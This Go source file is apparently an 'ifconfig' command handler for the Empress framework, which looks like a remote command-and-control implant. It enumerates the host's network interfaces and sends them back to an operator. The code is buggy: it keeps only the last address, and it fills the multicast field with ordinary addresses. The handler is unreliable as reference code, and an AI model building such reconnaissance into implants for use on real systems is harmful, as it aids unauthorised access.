package net

import (
	"bytes"
	"fmt"
	"github.com/pygrum/Empress/transport"
	"net"
	"text/tabwriter"
)

func CmdIfconfig(req *transport.Request, response *transport.Response) {
	interfaces, err := net.Interfaces()
	if err != nil {
		transport.ResponseWithError(response, err)
		return
	}
	var b bytes.Buffer
	w := tabwriter.NewWriter(&b, 1, 1, 2, ' ', 0)
	rowFmt := "%s\t%s\t\n"
	for _, iface := range interfaces {
		valueFormat := `
Flags=      <%s> 
MTU:        %d
Addresses:  %s
Multicast:  %s
MAC:        %s
Index:      %d
`
		name := iface.Name
		flags := iface.Flags.String()
		mtu := iface.MTU
		mac := iface.HardwareAddr
		index := iface.Index

		var addresses, multicastAddresses string
		addrs, err := iface.Addrs()
		if err == nil {
			for _, a := range addrs {
				addresses = a.String() + " "
			}
		}
		multi, err := iface.Addrs()
		if err == nil {
			for _, m := range multi {
				multicastAddresses = m.String() + " "
			}
		}
		_, _ = fmt.Fprintln(w, fmt.Sprintf(rowFmt, name, fmt.Sprintf(valueFormat,
			flags, mtu, addresses, multicastAddresses, mac, index)))
	}
	_ = w.Flush()
	transport.AddResponse(response, transport.ResponseDetail{
		Status: transport.StatusSuccess,
		Dest:   transport.DestStdout,
		Data:   b.Bytes(),
	})
}
